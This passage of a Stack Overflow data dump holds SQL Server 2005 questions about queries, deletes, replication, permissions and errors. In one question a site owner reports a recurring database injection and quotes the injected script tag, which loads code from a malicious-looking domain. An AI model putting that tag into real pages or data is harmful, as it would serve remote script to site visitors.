href=\"http://msdn.microsoft.com/en-us/library/ms188359%28v=sql.90%29.aspx\" rel=\"nofollow\">SQL Server 2005</a>. </p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":49,"score":-1,"question_id":11195037,"title":"Unable to restore from Snapshot","body":"<p>I've successfully created a snapshot of database SCPT_Pandora named SCPT_Pandora_snap. When I try to restore SCPT_Pandora from this snapshot, I get an error (\"'DATABASE_SHAPSHOT' is not a recognized Device Type option\"). I've tried this on two servers (2005 &amp; 2008 Enterprise editions) and received the same error on both.  Here's the code:</p>\n\n<pre><code>IF EXISTS ( SELECT  name\n        FROM    sys.databases\n        WHERE   name = N'SCPT_Pandora_snap' ) \nDROP DATABASE SCPT_Pandora_snap\nGO\n\nCREATE DATABASE SCPT_Pandora_snap ON\n\n(\n\n    NAME = SCPT_Pandora,\n\n    FILENAME = 'D:\\SQL2008_data\\SCPT_Pandora_snap.ss'\n\n) AS SNAPSHOT OF SCPT_Pandora\n\nGO\n\nUSE Master\nGO\n\nRESTORE DATABASE SCPT_Pandora FROM DATABASE_SHAPSHOT = 'SCPT_Pandora_snap';\nGO\n</code></pre>\n\n<p>Thanks!</p>\n"},{"tags":["sql","sql-server","linq","sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":76,"score":-4,"question_id":11173697,"title":"Update query for a specfic columns in all rows","body":"<p>I'm searching for check a columns value in all the rows and update with a where clause as a condition.  My case is as follows:</p>\n\n<pre><code>    SubscriptionID    ChannelURI    StudentID\n        1               XXXX             4\n        2               yyyy             4\n        3               XXXX             3\n        4               XXXX             4\n        5               XXXX             2\n</code></pre>\n\n<p>I want to check the column channel uri value for a specfic student and for all matched results to set it to null.</p>\n\n<p>So in this case row 3 and 5 should be set to null.</p>\n\n<p>I've tried this, but it set all <code>channeluri</code> of other rows than <code>studnetid = 4</code> to null</p>\n\n<pre><code>UPDATE SubscriptionCourse \n   Set ChannelURI = 1\n     , DeviceId = null \n  FROM SubscriptionCourse as t1 \n INNER JOIN SubscriptionCourse as t2 \n    on t1.ChannelURI = t2.ChannelURI \n WHERE StudentId! = 4 \n</code></pre>\n"},{"tags":["sql-server-2005","tsql","date","types"],"answer_count":4,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":2099,"score":3,"question_id":358410,"title":"Query to find all the tables with date columns in it","body":"<p>Can anybody let me know the query to find all the tables that has a  date columns on it.</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":8180042,"title":"Database backup with another server using SQL Server 2005","body":"<p>I have active Server A and standby Server B and B is replicating data from Server A. </p>\n\n<p>I'm using SQL Server 2005 enterprise edition. </p>\n\n<p>When Server A is failed, the application server is programmed to route traffic to Server B. </p>\n\n<p>Then Server B becomes active server and Server A becomes standby server. </p>\n\n<p>To turn Server A to be active server, the data modification when Server A failed in Server B needs to replicate back to Server A. </p>\n\n<p>I don't want to over load in active server. </p>\n\n<p>I'm thinking to use pull transactional replication method for replication. </p>\n\n<p>But I want to know what is the best method for doing above operations because this is the first time doing this operation for me. </p>\n"},{"tags":["sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":109,"score":0,"question_id":11187811,"title":"Copy values from one table to another in SQL","body":"<p>I have 2 tables. I need to update all rows of table 1 with the values in specific columns from table 2. They have the same structure.</p>\n\n<pre><code>UPDATE @TempTable       \nSET [MyColumn] =\n    (\n    SELECT [MyColumn]\n    FROM \n        [udf_AggregateIDs] (@YearId) AS [af]\n        INNER JOIN [MyForm] ON\n        (\n            [af].[FormID] = [MyForm].[FormID] AND\n            [af].[FormID] = @MyFormId\n        )\n    WHERE [Description] = [MyForm].[Description]\n    )\n</code></pre>\n\n<p>I get an error saying Subquery returned more than 1 value. I only added the where clause in because i thought sql is struggling to match the rows, but both tables have the same rows.\nIt should return multiple values because i'm trying to copy across all rows for MyColumn from the one table to the other.\nIdeas?</p>\n"},{"tags":["c#","sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":1,"view_count":210,"score":2,"question_id":11189764,"title":"SQL Identity Increment and Seed","body":"<p>I'm using <code>Microsoft SQL Server</code> for my database.</p>\n\n<p>There is an ID column in my table. In my usage, rows are deleted and re-created many times. So, if I use Identity Increment and Identity Seed of SQL Server, ID numbers will be very big after some time...</p>\n\n<p>It is not important that every new row have an ID that is bigger than other rows. Just it must be unique.</p>\n\n<p>How to do that in SQL Server? Should I disable Automatic Increment and set ID manually? how?</p>\n\n<p>I'm using C# and SQL Server Express.</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":33,"score":0,"question_id":11189687,"title":"Please correct my Query","body":"<pre><code>Select empno,sum(cast(substring(othours,0,3)as float)) as\nHour,sum(cast(substring(othours,4,5)as float)) as Minutes from tmstrans \ngroup by empno,othours\n</code></pre>\n\n<p>it is showing data like following</p>\n\n<ul>\n<li>1 , 10 </li>\n<li>1 , 30 </li>\n<li>2 , 10 </li>\n<li>2 , 30</li>\n</ul>\n\n<p>i need data like following</p>\n\n<ul>\n<li>1 , 40</li>\n<li>2 , 40</li>\n</ul>\n\n<p>please help</p>\n"},{"tags":["sql","sql-server","sql-server-2005","greatest-n-per-group"],"answer_count":10,"favorite_count":12,"up_vote_count":20,"down_vote_count":1,"view_count":38243,"score":19,"question_id":176964,"title":"select top 10 records for each category","body":"<p>I want to return top 10 records from each section in the one query. Can anyone help how to do it. Section is one of the column in the table.</p>\n\n<p>Database is sql server 2005. Top 10 by date entered. Sections are business, local and feature For one particular date I want only top(10) business rows (most recent entry), top (10 ) local rows and top (10) features for one particular date.</p>\n"},{"tags":["sql","tsql","sql-server-2005","function"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":11152062,"title":"Pad out an SQL table with data for Graphing Purposes","body":"<p><strong>SQL Server 2005</strong></p>\n\n<p>I have an SQL Function (ftn_GetExampleTable) which returns a table with multiple result rows</p>\n\n<pre><code>EXAMPLE\n\nID    MemberID MemberGroupID   Result1    Result2 Result3 Year Week\n1     1        1               High Risk  2       xx      2011 22\n2     11       4               Low Risk   1       yy      2011 21 \n3     12       5               Med Risk   3       zz      2011 25\netc.\n</code></pre>\n\n<p>Now I do a count and group by on a table above this for Result 2 for instance so I get </p>\n\n<pre><code>SELECT MemberGroupID, Result2, Count(*) AS ExampleCount, Year, Week \nFROM ftn_GetExampleTable \nGROUP BY MemberGroupID, Result2, Year, Week\n\nMemberGroupID  Result2  ExampleCount Year Week\n1              2        4            2011 22\n4              1        2            2011 21\n5              3        1            2011 25\n</code></pre>\n\n<p>Now imagine when I go to graph this new table between Weeks 20 and 23 of Year 2011, you'll see that it won't graph 20 or 23 or certain groups or even certain results in this example as they are not in the included data, so I need \"false data\" inserted into this table which has all the possibilities so they at least show on a graph even if the count is 0, does this make sense? </p>\n\n<p>I am wondering on the easiest and kind of most dynamic way as it could be Result1 or Result3 I want to Graph on (different column types).</p>\n\n<p>Thanks in advance </p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":152,"score":1,"question_id":11186374,"title":"Deleting rows older than 2 days ago quickly","body":"<p>I have a web app that reads data from a SQL DB that contains Message Tracking logs, for performance reasons I want to ensure there is never more than 2 days worth of logs in the DB.</p>\n\n<p>Normally this is a simple challenge, just delete the records right with a delete statement?</p>\n\n<p>Unfortunately not that simple for me, the table contains record counts in the millions and the delete statements take a while to run. Is there a way to make this any quicker?</p>\n\n<p>I'm currently doing this:</p>\n\n<pre><code>DECLARE @CutOffDate datetime;\nSET @CutOffDate = DATEADD(d, -2, GETDATE());\n\nWHILE @@ROWCOUNT &gt; 0\nBEGIN\n    DELETE TOP (2000) E12_MessageTracking\n    WHERE [TimeStamp] &lt; @CutOffDate;\n\n    DELETE TOP (2000) E12_MessageTracking_Recipients\n    WHERE [TimeStamp] &lt; @CutOffDate;\nEND\n</code></pre>\n\n<p>I am running the bulk insert queries quite frequently so I need to be able to run the deletes frequently as well, but currently the task is \"overrunning\" on the delete statements and the scripts that run are not able to keep up with real time.</p>\n\n<p>UPDATE:</p>\n\n<p>This is the version info that you guys asked for:</p>\n\n<p>Microsoft SQL Server 2008 R2 (RTM) - 10.50.1810.0 (X64)   Feb  3 2012 17:19:10   Copyright (c) Microsoft Corporation  Standard Edition (64-bit) on Windows NT 6.1  (Build 7600: ) (Hypervisor)</p>\n\n<p>For the indexes, the tables don't have a PK/FK relationship, but they \"link\" on a field called MessageID. The problem is MessageID is not always filled in so I am using a sub field called InternalMessageID which links better. One of the problems i've encountered is that there are multiple lines in the E12_MessageTracking table for each message, that link to the E12_MessageTracking_Recipients table.</p>\n\n<p>I'd love to have a proper relationship between these tables but right now I can't as I have no way of identifying all of the items that relate to a message without using the pre-existing InternalMessageID or MessageID columns.</p>\n\n<p>For indexes, they are as follows:</p>\n\n<p>E12_MessageTracking</p>\n\n<p>Index on the InternalMessageID column, with included columns set for Timestamp and Event</p>\n\n<p>E12_MessageTracking_Recipients</p>\n\n<p>Index on the InternalMessageID column, with included columns set for Timestamp and Recipient</p>\n\n<p>Thanks,\nChris.</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":86,"score":0,"question_id":11186257,"title":"Invalid object name error after restoring the database","body":"<p>I am using SQL Server 2005</p>\n\n<p>I have restored a database into <code>msdb</code> which is under system database, it successfully restored with all database tables but still when I type the query </p>\n\n<pre><code>select * from table name \n</code></pre>\n\n<p>from restored database table it is giving error that invalid object name..</p>\n\n<p>PLZ help me out</p>\n"},{"tags":["sql-server-2005","asp-classic","hacking"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":349,"score":2,"question_id":3836820,"title":"My web site database is hacked","body":"<p>My website has been attacked by some malicious script  / title  script src = http : // google-stats46.info/ur.php . This script is appended to any column(s) of some table automatically. I have removed this script. But after a few hours, it re-appeared in some tables. But this time it is  / title  script src = http : // google-stats45.info/ur.php \nThis has been happening since a week. I dont know how it is possible.\nPlease give me solution</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","sql-server-2000"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":113,"score":0,"question_id":11184470,"title":"sql server data type conversion","body":"<p>I have table with column Percentage varchar(10)\nData in that table is</p>\n\n<pre><code>Pecentage\n2/10\n4/10\n6/10\n..............\n</code></pre>\n\n<p>Now I have to convert above percentage to decimal,so now i am doing like this.\nselect CAST(percentage as decimal) from TabName\nI am getting following exception\nError converting data type varchar to numeric.</p>\n\n<p>I would like to get the results like 0.2,0.4,0.6</p>\n"},{"tags":["sql-server","tsql","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":168,"score":0,"question_id":11177316,"title":"Conditional group by in sql server?","body":"<p>i have this simple query : </p>\n\n<pre><code>SELECT YEAR(P.DateCreated)\n      ,MONTH(P.DateCreated)\n      ,COUNT(*) AS cnt\nFROM   tbl1,\n       tbl2....\nGROUP BY\n         MONTH(P.DateCreated)\n        ,YEAR(P.DateCreated)\n</code></pre>\n\n<p>this will emit : </p>\n\n<p><img src=\"http://i.stack.imgur.com/Euy9J.jpg\" alt=\"enter image description here\"></p>\n\n<p>now i need the same query but with groupby <strong>only</strong> per year : </p>\n\n<p>so :</p>\n\n<pre><code>SELECT YEAR(P.DateCreated)\n\n      ,COUNT(*) AS cnt\nFROM   tbl1,\n       tbl2....\nGROUP BY\n         YEAR(P.DateCreated)\n</code></pre>\n\n<p>i <em>dont</em> want to make 2 queries.</p>\n\n<p>is there any way i can do conitional <code>group by</code> here ? </p>\n\n<p>i can do with <em>one being replaced by another</em> , but i <strong>cant</strong> do <em>one being replaced by two</em>...</p>\n\n<pre><code>GROUP BY\n     CASE WHEN @timeMode='y' THEN YEAR(P.DateCreated)\n          WHEN @timeMode='m' THEN MONTH(P.DateCreated), YEAR(P.DateCreated) end\n</code></pre>\n\n<p><img src=\"http://i.stack.imgur.com/HC5dK.jpg\" alt=\"enter image description here\"></p>\n\n<p>any help ?</p>\n"},{"tags":["sql-server-2005","login"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":377,"score":0,"question_id":11176954,"title":"Login Failed - SQL Error Code 18456","body":"<p>I am using SQL server 2005, I go to \"Server Management Studio\" and use Windows<br> Authentication. Setting the Server Name as....my computer name, as server type: \"Database Engine\" and click \"Connect\". And I am given an error (code 18456). And it simply gives \"State 1\".....?\nSo basically, I am unable to login.</p>\n\n<p>The error details are given below: </p>\n\n<pre><code>    TITLE: Connect to Server\n------------------------------\n\nCannot connect to ******.\n\n------------------------------\nADDITIONAL INFORMATION:\n\nLogin failed for user '******\\******'. (Microsoft SQL Server, Error: 18456)\n\nFor help, click: http://go.microsoft.com/fwlink?ProdName=Microsoft+SQL+Server&amp;EvtSrc=MSSQLServer&amp;EvtID=18456&amp;LinkId=20476\n\n------------------------------\nBUTTONS:\n\nOK\n------------------------------\n</code></pre>\n\n<p>Any help?</p>\n"},{"tags":["sql-server-2005","mars"],"answer_count":3,"favorite_count":1,"up_vote_count":9,"down_vote_count":0,"view_count":2541,"score":9,"question_id":374444,"title":"Disadvantages of MARS (Multiple Active Result Sets)?","body":"<p>Does anyone know of any disadvantages of MARS (Multiple Active Result Sets)?  Does anyone know of any reason why one should avoid using MARS, like cases where cursors are more useful then MARS.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":6,"favorite_count":0,"up_vote_count":7,"down_vote_count":0,"view_count":3835,"score":7,"question_id":794865,"title":"What is the best way to delete a large number of records in t-sql?","body":"<p>We've run across a slightly odd situation.  Basically there are two tables in one of our databases that are fed tons and tons of logging info we don't need or care about.  Partially because of this we're running out of disk space.</p>\n\n<p>I'm trying to clean out the tables, but it's taking forever (there are still 57,000,000+ records after letting this run through the weekend... and that's just the first table!)</p>\n\n<p>Just using delete table is taking forever and eats up drive space (I believe because of the transaction log.) Right now I'm using a while loop to delete records X at a time, while playing around with X to determine what's actually fastest.  For instance X=1000 takes 3 seconds, while X=100,000 takes 26 seconds... which doing the math is slightly faster.</p>\n\n<p>But the question is whether or not there is a better way?</p>\n\n<p>(Once this is done, going to run a SQL Agent job go clean the table out once a day... but need it cleared out first.)</p>\n"},{"tags":["sql","sql-server-2005","join"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":11155861,"title":"Confused on the logic of multiple joins on multiple tables","body":"<p>I'm having a little problem with extracting and counting data from my database due to the way the database is setup. </p>\n\n<p>Each case has multiple customers and suppliers with one main supplyer. </p>\n\n<p>The main problems i need to over come are as follows: </p>\n\n<ol>\n<li><p>To be able to first count the full amount of customers between a period of months driven by when the suppler jonied the company. </p></li>\n<li><p>Count how many customers have had an \"initial contact\" as sometimes there will be no initial contact in the database. </p></li>\n</ol>\n\n<p>I have tried to do this by using multiple joins in a single query but this doesn't seem to return complete data. </p>\n\n<p>I'm so confused with using multiple joins, i understand that they can be executed in any order but i'm unsure what the second join is running on and also is i can legally join unrelated table in the same query or if i need to do a seperate query to do this. </p>\n\n<p>Please find below a recreation of one of my many queries below with a very simplfied picture : </p>\n\n<pre><code>SELECT Count(cc.customercase)\nFROM   customer cc\n       LEFT JOIN customer\n              ON cc.custid = c.custid\n       LEFT JOIN maincase m\n              ON m.id = cc.caseid\n       LEFT JOIN custcontactlog cl\n              ON cl.caseid = cc.custcaseid\n       LEFT JOIN supcase sc\n              ON sc.caseid = m.id\nWHERE  cl.contactlogtype = 'Initial Contact'\n       AND sc.primarysupplyer = 1\n       AND Calctargetdate(sc.joindate) &gt; cl.postdate\n       AND cl.postdate &gt; sc.joindate\n       AND c.gender = 'M'\n       AND sc.joindate BETWEEN CONVERT(DATETIME, '01/01/2012', 103) AND\n                               CONVERT(DATETIME, '31/03/2012', 103)  \n</code></pre>\n\n<p><a href=\"http://i50.tinypic.com/2qk3pqa.png\" rel=\"nofollow\">http://i50.tinypic.com/2qk3pqa.png</a></p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005","impersonation"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":161,"score":2,"question_id":10045699,"title":"SQL Server Execute Impersonation","body":"<p>What is the diffrence between... </p>\n\n<pre><code>execute as user = 'testuser'\n</code></pre>\n\n<p>AND</p>\n\n<pre><code>execute as login = 'testuser'\n</code></pre>\n\n<p>I am executing a cross database procedure under these logins and it works with the exececute as login but not the execute as user. It is saying the server principal \"testuser\" is nt able to access the database \"xxx\" under the securty context.</p>\n\n<p>When i <code>SELECT SYSTEM_USER</code> after both commands I see that it is set to <code>'testuser'</code></p>\n"},{"tags":["sql","sql-server-2005","xquery"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":93,"score":0,"question_id":11161860,"title":"Insert int variable into xml type ","body":"<p>What a want to do is something like that:</p>\n\n<pre><code>declare @id int\nset @id = (select ID from tbUsers where Name = 'John_Stack')\n\ndeclare @xml xml\nset @xml = '&lt;users&gt; &lt;user id = \"' + @id + '\"/&gt;&lt;/users&gt;'\n</code></pre>\n\n<p>The server aborted saying </p>\n\n<blockquote>\n  <p>Operand type clash: int is incompatible with xml.</p>\n</blockquote>\n\n<p>What is the best way to do this?</p>\n\n<p>I'm working with SQL Server 2005.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["sql-server","sql-server-2005","permissions","grant"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":647,"score":1,"question_id":781636,"title":"How to grant permissions to developers to grant permissions to users?","body":"<p>Is there a way I can give developers permission to grant a user permissions over objects without giving them the option to create users or functions?</p>\n\n<p>I'm trying to limit developers permissions, I recently found out that developers had <code>db_owner</code> permissions in dev and prod environments! So I'm doing my best to stop this madness.</p>\n\n<p>Any good article about this matter?</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":11160492,"title":"remove cursor without key to link to","body":"<p>thought I'd solved this one but it comes back!! trying to eliminate this last cursor on a stored proc I'm refactoring. </p>\n\n<p>My problem is I do not have a column in table loaded into the cursor to link into my #UTM2 table to eliminate the cursor and bring it all back in one set. Is there a workaround for this ???</p>\n\n<pre><code> DECLARE @ChannelId INT, \n         @URLSignature Varchar(30), \n         @RawSQL VARCHAR(2000), \n         @SQLQuery VARCHAR(4000), \n         @ThisUTMId BIGINT  \n\n DECLARE cursChannels CURSOR STATIC \n     FOR \n     SELECT ChannelId, URLSignature, RawSQL  \n     FROM dbo.TrackingChannel_tbl (NOLOCK)  \n     WHERE ProcessVisitDate = 1  \n\n\n  IF @URLSignature &lt;&gt; ''  \n  SET @SQLQuery = @SQLQuery + 'AND u.RawURLRequest like ''%' + @URLSignature + '%'' '    \n\n  IF @RawSQL &lt;&gt; ''  \n  SET @SQLQuery = @SQLQuery + @RawSQL  \n\n  EXEC (@SQLQuery)  \n\n\nINSERT INTO dbo.TrackingChannelDailyTotal_tbl \n           (ChannelId, TrackingDate, Conversions, TotalMargin)  \nSELECT @ChannelId, @ConvDate, Count(u1.trpUTMID), IsNUll(SUM(TotalMargin),0)  \nFROM #UTM u1 \nJOIN #UTM2 u2 \nON u1.TRputmid = u2.trputmid  \n\nFETCH cursChannels INTO @ChannelId, @URLSignature, @RawSQL  \n</code></pre>\n\n<p>amendment, how the #temp table is populated</p>\n\n<pre><code>        CREATE TABLE #UTM \n      (trpUTMID BIGINT PRIMARY KEY, \n       TotalMArgin MONEY, \n       RawURLRequest Varchar(2000), \n       Keywords VARCHAR(1000), VisitDate DATETIME, \n       RefererURL VARCHAR(2000))  \n\n\n    INSERT INTO #UTM (trputmid, TotalMargin)  \n       SELECT trpUTMID, SUM(b.TotalMArgin)  \n       FROM TrackingConversion_tbl  c (NOLOCK) \n       JOIN  Booking_tbl b (NOLOCK)             \n       ON c.BookingId = b.BookingId \n       WHERE\n          c.bookedDate &gt; @convDate \n       GROUP BY trputmid  \n\n    UPDATE u  \n       SET RawURLRequest = v.RawURLRequest,  \n           Keywords = v.Keywords,  \n           VisitDate = v.VisitDate,  \n           RefererURL = v.RefererURL  \n      FROM #UTM u,    \n           TrackingVisit_tbl (NOLOCK)  v   \n      WHERE v.trpUTMID = u.trpUTMId\n</code></pre>\n\n<p>hoping to achieve results </p>\n\n<pre><code>ChannelId  TrackingDate             Conversions  TotalMargin\n---------  -----------------------  -----------  -----------\n1          2012-03-14 00:00:00.000  0            0.00\n2          2012-03-14 00:00:00.000  22           557.0296\n3          2012-03-14 00:00:00.000  0            0.00\n</code></pre>\n\n<p>for each day up to the current date or the 41 channels</p>\n"},{"tags":["sql-server","sql-server-2005","syntax","brackets"],"answer_count":9,"favorite_count":0,"up_vote_count":13,"down_vote_count":0,"view_count":6421,"score":13,"question_id":52898,"title":"What is the use of the square brackets [] in sql statements?","body":"<p>I've noticed that Visual Studio 2008 is placing square brackets around column names in sql. Do the brackets offer any advantage? When I hand code T-SQL I've never bothered with them.</p>\n\n<p>Example:\nVisual Studio:\nSELECT [column1], [column2] etc...</p>\n\n<p>My own way:\nSELECT column1, column2 etc...</p>\n"},{"tags":["sql-server-2005","coalesce"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":74,"score":-1,"question_id":11162363,"title":"COALESCE with a Potential Empty Field - SQL Server 2005","body":"<p>Here's the issue:  When a Patient comes into the doctor's office, they can have their blood pressure taken 3 times.  The first time is bp1; the second is bp2 and the last time is bp3.  </p>\n\n<p>I need to find the last time a patient had their blood pressure checked and what it was.  I thought I could use COALESCE(bp3,bp2,bp1).  However; the system doesn't always make the unused fields NULL.  Sometimes, they're empty.  </p>\n\n<p>An example of the data would be:</p>\n\n<p>PatientID    bp1    bp2 bp3\n12345   140/90  134/30<br>\n12346   NULL    128/68  NULL</p>\n\n<p>Then, I thought I'd use COALESCE(NULLIF(bp3,bp2),bp1)  but that isn't working because sometimes the database shows NULL for bp1 or NULL for bp1 and bp3, but there's a blood pressure in bp2.</p>\n\n<p>Anyone have any ideas on how to resolve this?</p>\n\n<p>Thanks!</p>\n"},{"tags":["sql-server-2005","recursive-query"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":11160876,"title":"Recursive SQL Query","body":"<p>I am using SQL Server 2005 and am familiar with the basics, but have an issue that is a bit over my head which I would appreciate any help on.</p>\n\n<p>I have two tables I am trying to work with.  One is an employee database table and one is an organization table.  In the employee table each employee has a department id associated with them and a current employment status.  In the organization table there is a list of department ids, which department that department rolls up under, and a current active status.  I need to create a query that I can give a department id to that will return the total number of active (value - A) employees in that department and all the active (value - A) departments below it all the way to the bottom.</p>\n\n<p>The relevant tables and the columns:<br>\n<strong>EE_Persons_today</strong><br>\nDEPTID<br>\nEMPL_STATUS</p>\n\n<p><strong>DEPARTMENT_DATA</strong><br>\nDEPTID<br>\nREPORTS_TO_DEPT<br>\nEFF_STATUS</p>\n\n<p>Example:<br>\nDepartment IT has 300 people directly assigned to it, but also has 2 subgroups, Software and Hardware.  Hardware has 100 people directly assigned to it and no sub groups.  Software has 100 people directly assigned to it and 1 subgroup called Enterprise with 50 people directly assigned to it.  If I ask for how many are in IT it would be 300+100+100+50 = 550.  If I ask for how many are in Software it would be 100+50=150.</p>\n"},{"tags":["sql-server-2005","security","windows-xp","ssms"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":3268,"score":3,"question_id":2231500,"title":"Error connecting to all of my SQL servers","body":"<p>I suddenly started getting this error when trying to connect to any of my sql servers (25+) from SSMS on Windows XP. When I left work yesterday everything was working fine, came in this morning, and I started getting this. Tried rebooting my pc but that obviously didn't fix it. My co-workers can all connect just fine. Searched for a solution but everything I found was regarding encryption in regards to .NET applications. Not sure how to apply that to SSMS. \n<img src=\"http://picasaweb.google.com/lh/photo/-l9VrFuYXk-A80NzZ1kzng?feat=directlink\" alt=\"alt text\"></p>\n\n<p>For some reason the image won't work so the error is this:</p>\n\n<p><strong>A connection was successfully established with the server, but then an error occurred during the pre-login handshake. (provider: SSL Provider, error: 0 - The certificate chain was issued by an authority that is not trusted.) (Microsoft SQL Server)</strong></p>\n"},{"tags":["sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":11154973,"title":"SQL Server  2005 I am not able to read from a table","body":"<p>Please suppose that in SQL Server 2005, if you launch the following query:</p>\n\n<pre><code>SELECT CHICKEN_CODE FROM ALL_CHICKENS WHERE MY_PARAMETER = 'N123123123';\n</code></pre>\n\n<p>you obtain:</p>\n\n<pre><code>31\n</code></pre>\n\n<p>as result.</p>\n\n<p>Now, I would like to write a function that, given a value for <code>MY_PARAMETER</code>, yields the corresponding value of <code>CHICKEN_CODE</code>, found in the table <code>ALL_CHICKENS</code>.</p>\n\n<p>I have written the following stored function in SQL Server 2005:</p>\n\n<pre><code>ALTER FUNCTION [dbo].[determines_chicken_code]\n(\n    @input_parameter                         VARCHAR \n)\nRETURNS varchar\nAS \nBEGIN\n    DECLARE @myresult varchar\n\n    SELECT @myresult  =  CHICKEN_CODE\n    FROM dbo.ALL_CHICKENS\n    WHERE MY_PARAMETER = @input_parameter\n\n    RETURN @myresult\nEND\n</code></pre>\n\n<p>But if I launch the following query:</p>\n\n<pre><code>SELECT DBO.determines_chicken_code('N123123123') \n</code></pre>\n\n<p>it yields:</p>\n\n<pre><code>NULL\n</code></pre>\n\n<p>Why?</p>\n\n<p>Thank you in advance for your kind cooperation.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":304,"score":2,"question_id":11141100,"title":"How to get Quarter from a date in TSQL","body":"<p>I have a different dates in a column .For example 20080102,20070821</p>\n\n<p>I want to convert this date in Year and quarter .</p>\n\n<pre><code>Below is the output: \nYear       Quarter\n2008      2008-Q1\n2007      2007-Q3\n</code></pre>\n\n<p>select left(date,4) as year from table </p>\n\n<p>How can i get the Quarter level details .</p>\n"},{"tags":["c#","sql-server-2005","ado.net"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":129,"score":0,"question_id":11152260,"title":"how to page and query large data in c#","body":"<p>I need to query large amount of data from a database via C# and ADO.NET (<code>IDbDataReader</code> and <code>IDbCommand</code> API).\nI've created a query like the follwing:</p>\n\n<pre><code>WITH v as \n\n(SELECT myFields, Datefield \n\nROW_NUMBER() OVER (ORDER BY Datefield ASC) AS CurrentRow \n\nFROM dbTable \n\nWHERE /**/ \n\nAND Datefield BETWEEN @pStart AND @pEnd \n\n// ... )\n\n\nSELECT myFields, Datefield from v where CurrentRow \nBETWEEN @pRowStart AND @pRowEnd\n</code></pre>\n\n<p>From the results I have to use an C# API which will transform and generate new data,\nthats why an SqlServer - only solution can't be used.</p>\n\n<p>I want to query against the database with a pagesize of 10000 until there is no more data.\nSomething like</p>\n\n<pre><code>while (true)\n{\n  // ... execute reader\n  if (reader.HasRows) \n     break;\n}\n</code></pre>\n\n<p>will not work cause I have to use the IDbDataReader interface.</p>\n\n<p>What can I do in my situation?</p>\n\n<p><strong>EDIT + Solution</strong>\nI iterate over each block in a while loop and check <code>HasRows</code> property of the datareader, cause i can use the specialized type.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":11150243,"title":"Display a resultset where each cell is based on different condition using stored procedure","body":"<p>I have a table from which I query data to display resultset using stored procedure. I also have a value to be given in the where condition  that keeps changing for each and every cell and that parameter is not available in the table from which I have to query. As of now, I have hardcoded the for that particular parameter. My resultset should consist of 7 rows and 16 columns. Is there any optimistic way instead of hardcoding it ? Any help is appreciated.</p>\n\n<p>Here is the temp table I ve hardcoded:</p>\n\n<pre><code> create table #temp_financials(iden_val int identity(1,1) ,\n     categ varchar(100),Retail_RDR varchar(100),Avg_Price_RDR varchar(100), \n             GPVR_RDR   varchar(100),\n            L_RDR varchar(100),\n       L_Avg_Price varchar(100),L_GPVL varchar(100),\n    C_RDR varchar(100),C_Avg_Price varchar(100),C_GPVR varchar(100),\n     C_Rgn_GPVR varchar(100),C_Nat_GPVR varchar(100),\n       C_Lease_Penet varchar(100),C_Rgn_Penet varchar(100))\n\n    insert into #temp_financials(categ,Retail_RDR ,Avg_Price_RDR , GPVR_RDR ,\n      L_RDR ,L_Avg_Price ,L_GPVL ,\n        C_RDR ,C_Avg_Price ,C_GPVR ,C_Rgn_GPVR ,C_Nat_GPVR ,\n        C_Lease_Penet ,C_Rgn_Penet ) \n                 values('Ttl  Sum',             \n         'B9720','B9996','B9776','B9722','B9997','B9791','B9733','B10003','B9806','B9806                 ','B9806','B9885','B9885'  )\n         insert into #temp_financials(categ,Retail_RDR ,Avg_Price_RDR , GPVR_RDR ,\n     L_RDR ,L_Avg_Price ,L_GPVL ,\n          C_RDR ,C_Avg_Price ,C_GPVR ,C_Rgn_GPVR ,C_Nat_GPVR ,\n         C_Lease_Penet ,C_Rgn_Penet ) \n                  values        ('B9870','B9773','4042A','B9998','B9788',\n            